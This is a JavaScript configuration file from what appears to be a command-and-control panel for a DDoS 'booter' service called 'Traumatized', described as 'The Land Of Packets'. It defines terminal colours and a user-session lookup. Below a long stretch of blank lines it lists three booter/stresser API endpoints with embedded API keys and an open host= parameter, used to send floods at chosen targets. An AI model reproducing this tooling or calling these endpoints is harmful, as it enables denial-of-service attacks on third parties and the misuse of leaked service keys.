const fs = require("fs");
const crud = require("../auth/crud.js");
const config = require("../config/strings.js");
const f = require("node-fetch");

exports.hostname = function(name) {
    if(name === null || name === "undefined") {
        name = "CNC";
    }
    return "\x1b[95m[\x1b[96mOxzy\x1b[95m@\x1b[96m" + name + "\x1b[95m]\x1b[96m#~ \x1b[95m";
}

exports.Colors = {
    "Red": "\x1b[31m",
    "Yellow": "\x1b[33m",
    "Blue": "\x1b[34m",
    "Purple": "\x1b[95m",
    "Green": "\x1b[32m",
    "Cyan": "\x1b[96m",
    "Black": "\x1b[30m",
    "Grey": "\x1b[90m",
    "Reset": "\x1b[39m",
    "Background_Red": "\x1b[41m",
    "Background_Green": "\x1b[42m",
    "Background_Grey": "\x1b[100m",
    "Background_Reset": "\x1b[49m",
    "Clear": "\033[2J\033[1;1H"
}

exports.CNC_Info = {
    "Name": "Traumatized",
    "Description": "The Land Of Packets",
    "Version": "3.00",
    "Discord_server": "scrapy.tech/discord"
}

exports.CurrentCMD = {
    "Cmd": "",
    "arg": [],
    "fullcmd": ""
}

exports.CurrentUser = {
    "Username": "",
    "IP": "",
    "Password": "",
    "Level": "",
    "Maxtime": "",
    "isAdmin": false
}

exports.GetCurrentUser = function(ip) {
    if(crud.isSignedIn(ip)) {
        let get_user = crud.user(ip, "all");
        let info = get_user.split(",");
        config.CurrentUser.username = info[0];
        config.CurrentUser.IP = info[1];
        config.CurrentUser.password = info[2];
        config.CurrentUser.Level = info[3];
        config.CurrentUser.Maxtime = info[4];
        switch(parseInt(info[5])) {
            case 0:
                config.CurrentUser.isAdmin = false;
                break;
            case 1:
                config.CurrentUser.isAdmin = true;
        }
    } else {
        console.log("User is not signed in to pull stats!");
    }
}



















































  
exports.BOOTERAPI = "https://onyxapi.online/AllAPI.php?key=Zerro-1m-34758347&host=";
exports.BOOTERAPI2 = "https://envystress.me/api/api.php?key=AyTRDkXMhRKSIwlH&host=";
exports.BOOTERAPI3 = "https://plutoniumstress.com/api/api.php?key=jAq6KRfifVhb5PjY&host=";